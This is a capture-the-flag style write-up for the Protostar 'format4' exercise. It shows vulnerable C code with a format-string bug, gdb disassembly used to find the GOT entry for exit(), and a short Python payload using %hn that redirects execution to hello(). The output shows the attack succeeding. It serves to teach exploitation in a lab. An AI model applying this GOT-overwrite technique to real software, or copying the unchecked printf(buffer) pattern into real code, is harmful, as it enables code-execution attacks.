# FORMAT 4

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);                       // <-- Format String Vuln

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

## OVERVIEW & IDEA

- We can easily see the format string vuln in the code, and the mission of us is redirect the program run into `hello()` function.

- The program use `exit(1);` after `printf(buffer);`, so we can't overwrite the return of `hello()`.

- My idea is overwrite address of `exit()` to `hello()`'s address in GOT, so, when the program run `exit()`, it redirects to `hello()` function instead of exit program, and in `hello()` function we does not have `exit()` function, so we aren't worry about infinity loop of calling `hello()` function. 

> If you wonder wtf GOT or shared library is, you can check out the ROP_Dynamic in b10s. 

## DETAIL


- First, I am going to find the GOT address of exit by check out the exit@plt.

```asm
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   ebp
0x080484d3 <vuln+1>:    mov    ebp,esp
0x080484d5 <vuln+3>:    sub    esp,0x218
0x080484db <vuln+9>:    mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:   lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:   mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>   ; <-- exit@plt address
End of assembler dump.
```

- Checking out the instruction of exit@plt's address and we got the GOT's address of `exit().

```asm
(gdb) x/3i 0x80483ec
0x80483ec <exit@plt>:   jmp    DWORD PTR ds:0x8049724  ; <-- exit() GOT address
0x80483f2 <exit@plt+6>: push   0x30
0x80483f7 <exit@plt+11>:        jmp    0x804837c
```

- We also need the address of `hello()` function to overwrite in `exit()` GOT address. 

```asm
(gdb) disass hello
Dump of assembler code for function hello:
0x080484b4 <hello+0>:   push   ebp
0x080484b5 <hello+1>:   mov    ebp,esp
0x080484b7 <hello+3>:   sub    esp,0x18
0x080484ba <hello+6>:   mov    DWORD PTR [esp],0x80485f0
0x080484c1 <hello+13>:  call   0x80483dc <puts@plt>
0x080484c6 <hello+18>:  mov    DWORD PTR [esp],0x1
0x080484cd <hello+25>:  call   0x80483bc <_exit@plt>
End of assembler dump.
```

- We can see that the address of `hello()` and `exit()` GOT has the same 2 bytes at the left side. So we can only change the 2 remain bytes at the right side of `exit()` GOT address from `9724` to `84b4` to get the final address is `hello()` address.



## EXPLOIT

```python
# filename: exp.py

payload = "\x24\x97\x04\x08"
# Just use AAAA.%p.%p.%p ... to find the index, here I found the index is 4
payload += "%33968c%4$hn"   

print(payload)

# python exp.py | ./format4
```

## RESULT

```
root@protostar:/opt/protostar/bin# python exp.py | ./format4
$�

... a bunch of space :v ...

code execution redirected! you win
root@protostar:/opt/protostar/bin#
```